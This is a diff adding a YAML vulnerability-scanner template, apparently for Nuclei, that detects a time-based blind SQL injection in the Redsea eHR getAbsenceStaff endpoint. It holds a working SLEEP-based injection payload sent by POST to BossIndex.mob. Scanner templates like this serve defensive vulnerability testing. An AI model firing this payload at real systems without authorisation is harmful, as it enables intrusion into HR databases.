@@ -1,0 +1,55 @@
+id: poc-yaml-hr-soft-getabsencestaff-sqli
+info:
+  name: Redsea eHR getAbsenceStaff SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-platform
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+
+  - id: sqli-check
+    method: POST
+    path:
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      method=getAbsenceStaff&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
